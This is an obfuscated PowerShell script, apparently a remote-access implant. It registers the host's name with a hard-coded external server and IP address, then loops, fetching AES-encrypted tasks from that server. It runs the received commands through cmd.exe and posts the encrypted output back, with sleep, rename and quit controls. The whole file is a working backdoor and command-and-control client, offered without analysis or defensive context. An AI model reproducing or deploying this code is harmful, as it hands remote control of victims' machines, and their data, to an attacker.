
${8rT3WA}  = [tyPe]'sySTEm.seCUrItY.cryPTOGRaphY.CiphERMOde' ;
SV '72j5O'  (  [TYpe]'sYstem.seCuriTY.cRYptoGRapHY.paDDingmOde'  ) ;   
${XNfD}=[tyPe]'System.cONVErT'  ;  
${HLvW1} =  [tYPe]'SYStEM.tEXt.EnCOdiNG';  
SeT-iTem 'vARIabLE:92y7'  (  [Type]'SysteM.NEt.dnS')  ; 
${UJXRc}=[tyPE]'StrinG' ;

function CrEATe-AeSmanAGeDoBJeCt(${vxZTmff}, ${5TMRWpLUy}) {

    ${AJuJVRAZ99}           = New-Object 'System.Security.Cryptography.AesManaged'
    ${AJUjvrAZ99}.Mode      =   (  gEt-vARIAblE  ("8rt3Wa") -Value  )::"cBc"
    ${aJujVRAZ99}.PAddInG   =  ( Dir  'vARIable:72j5o'  ).VALUe::"zeRos"
    ${AJUJvrAz99}.BlOckSizE = 128
    ${AjuJvRAz99}.keysIze   = 256
    
    if (${5TMRWPluy}) {
        
        if (${5TmRWpLuy}.getType.iNVOke().nAME -eq 'String') {
            ${ajUjvRaZ99}.Iv =  (dir  'vaRIaBle:xNFd').vAlUe::'FromBase64String'.InVOKe(${5TMRWPlUy})
        }
        
        else {
            ${ajUjVraZ99}.IV = ${5tmRwPLUy}
        }
    }
    
    if (${VxZtMFF}) {
        
        if (${VXzTmfF}.getType.INvoKe().nAME -eq 'String') {
            ${ajUjVraZ99}.Key =  ( LS 'VariAble:XNFD' ).vAluE::'FromBase64String'.invOKe(${vxzTmFF})
        }
        
        else {
            ${AjUJVrAZ99}.key = ${vXzTmff}
        }
    }
    
    ${aJUjvRAZ99}
}
function eNCRYpT(${VxzTMFf}, ${ROFPdqRF99}) {
    
    ${ByTES}             =   (  varIable  'hlvW1' ).vALUE::"uTf8".GetBytes.INVokE(${rOFpdQRF99})
    ${ajujVRAZ99}        = Create-AesManagedObject ${VXZtMFf}
    ${qDIqLGaQ99}         = ${aJujVRAZ99}.CreateEncryptor.inVoKe()
    ${lwihYmIF99}     = ${QdiqLgaq99}.TransformFinalBlock.iNvOKe(${byTeS}, 0, ${byTes}.LeNgTh);
    [byte[]] ${fJAxUWQN99} = ${AJujvRAz99}.Iv + ${lWiHYmiF99}
    ${ajUJVRAZ99}.Dispose.iNVOKE()
     ${xNFd}::"tOBase64STRiNG".iNvoke(${FjAXUWqN99})
}
function deCRyPT(${VXztmFF}, ${bKJrxQCf99}) {
    
    ${bYTEs}           =   (vARiable  'xnfd' ).ValuE::'FromBase64String'.InVOKE(${BkjRxqcF99})
    ${5tMRWpLuY}              = ${BYTes}[0..15]
    ${aJuJVraz99}      = Create-AesManagedObject ${VxZTmFF} ${5TMRwpLUY}
    ${MNDmWYnB99}       = ${AJUjvRAz99}.CreateDecryptor.InVoke();
    ${AhtLMYhl99} = ${MNDmWynB99}.TransformFinalBlock.iNvokE(${bYTES}, 16, ${byTeS}.lENgTH - 16);
    ${AJUjVRAZ99}.Dispose.INVOKE()
      ${HLVW1}::"uTF8".GETStriNg(${AhtLmYhl99}).TRIM(' ')
}
function ShELL(${DfJz1co}, ${yo8xm5}){
    
    ${CwzVYVJ}                        = New-Object 'System.Diagnostics.ProcessStartInfo'
    ${CwZVyVj}.FIlename               = ${DFjZ1co}
    ${CWzvYvj}.reDIRecTsTAnDaRdERrOR  = ${TRue}
    ${cwZVYVJ}.ReDIREcTsTANdarDoUTPUT = ${tRUe}
    ${CWZvyVJ}.USEshELleXeCUTe        = ${FALsE}
    ${cwzvyVJ}.aRgUmENtS              = ${yO8xm5}
    ${p}                            = New-Object 'System.Diagnostics.Process'
    ${P}.sTArTiNFO                  = ${CWzvYVj}
    
    ${p}.Start.INvoKE() | Out-Null
    ${P}.WaitForExit.invoKE()
    
    ${BHnxNUrW99} = ${p}.staNdardOuTpUT.ReadToEnd.INVOkE()
    ${NmWkjOAB99} = ${p}.StANdArdeRrOR.ReadToEnd.Invoke()
    ${kCNjcQdL} = ('VALID '+"$BhnXnUrW99n$nmWKJOAb99")
    ${KcnJcQDl}
}
${FZvyCr}   = '128.199.207.220'
${twFTrI} = '7331'
${VxzTmff}  = 'd/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M='
${n}    = 3
${Cwj2TWh} = ""
${yCRUTw} =   ${92Y7}::'GetHostName'.inVoKE()
${FNFFGXDzj}  = "p"
${DFctDFM}  = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/reg")
${kVQBXbuR}  = @{
    'name' = "$YCRUTw" 
    'type' = "$fNFFGXDZJ"
    }
${CWj2TWh}  = (Invoke-WebRequest -UseBasicParsing -Uri ${dFctDFM} -Body ${kVqBxbUr} -Method 'POST').coNTENT
${TvYMeYrR99} = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
${iJfySE2}   = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")
for (;;){
    
    ${MA04XMgY}  = (Invoke-WebRequest -UseBasicParsing -Uri ${IJFYSE2} -Method 'GET').cONTeNt
    
    if (-Not  ${UJXRc}::'IsNullOrEmpty'.INvOKe(${MA04XmGy})){
        
        ${mA04XMgY} = Decrypt ${VXZTmff} ${Ma04XMgY}
        ${mA04XMgY} = ${ma04XMgy}.split.INvokE()
        ${FLAG} = ${MA04xmgY}[0]
        
        if (${FlAg} -eq 'VALID'){
            
            ${WB1SWYoje} = ${MA04XMgY}[1]
            ${yO8XM5S}    = ${Ma04XMgY}[2..${MA04xmgY}.LeNgTH]
            if (${wb1sWyoJe} -eq 'shell'){
            
                ${F}    = 'cmd.exe'
                ${yO8XM5}  = "/c "
            
                foreach (${a} in ${yo8xM5s}){ ${Yo8xm5} += ${a}}
                ${KcNJCQdL}  = shell ${f} ${yo8xM5}
                ${kCnjCQDL}  = Encrypt ${VxztMFF} ${kcNjcqdl}
                ${kvqbXBUr} = @{'result' = "$KcnJCQDl"}
                
                Invoke-WebRequest -UseBasicParsing -Uri ${tVyMEyRR99} -Body ${kVQbXbur} -Method 'POST'
            }
            elseif (${Wb1SwYOJe} -eq ''){
            
                ${f}    = '.exe'
                ${yO8Xm5}  = "/c "
            
                foreach (${a} in ${Yo8xM5s}){ ${YO8xm5} += ${a}}
                ${kcNjcqdL}  = shell ${F} ${yO8XM5}
                ${kcnjCQDL}  = Encrypt ${vXZTmfF} ${KCNjcqDl}
                ${KVqbxBUr} = @{'result' = "$KcnJCQDl"}
                
                Invoke-WebRequest -UseBasicParsing -Uri ${tvyMEYRR99} -Body ${kVqBXbUr} -Method 'POST'
            }
            elseif (${wb1swYOJe} -eq 'sleep'){
                ${n}    = [int]${yO8Xm5S}[0]
                ${kVQBXbur} = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri ${tVYmeyrR99} -Body ${KvQBXBur} -Method 'POST'
            }
            elseif (${wb1sWyojE} -eq 'rename'){
                
                ${cwJ2tWh}    = ${YO8Xm5S}[0]
                ${TVYmeyRr99} = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
                ${ijFYsE2}   = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")
            
                ${kVQbXbUr}    = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri ${TVYmEyRR99} -Body ${KvqBxbUr} -Method 'POST'
            }
            elseif (${wB1sWYOJe} -eq 'quit'){
                exit
            }
        }
    sleep ${N}
    }
}
